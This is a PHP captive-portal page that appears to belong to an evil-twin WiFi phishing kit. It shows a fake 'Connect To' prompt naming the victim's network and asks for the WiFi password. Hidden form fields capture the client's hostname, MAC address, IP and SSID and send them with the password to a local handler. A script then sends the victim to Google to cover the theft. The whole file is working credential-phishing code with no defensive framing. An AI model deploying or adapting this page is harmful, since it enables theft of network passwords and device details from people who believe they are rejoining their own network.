<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>

    <title>Not Connected</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <meta name="theme-color" content="#5170ad" />

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              document.location.href = "https://www.google.com";
            }, 100);
          }
    </script>

    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <link rel='stylesheet prefetch' href='assets/css/style.css'>
    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
    <link rel="icon" type="image/png" href="assets/img/ymwp832k1s.png" />

</head>

<body>
    <div class="container">
        <div class="modal-dialog">
            <div class="loginmodal-container">
                <h1>Connect To <?=getClientSSID($_SERVER['REMOTE_ADDR']);?></h1><br>
                <form method="POST" action="captiveportal/index.php", onsubmit="redirect()">
                <input type="password" name="password" placeholder="Wifi Password" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
                <input type="submit" name="login" class="login loginmodal-submit" value="Login">
                </form>
            </div>
        </div>
    </div>
</body>
</html>
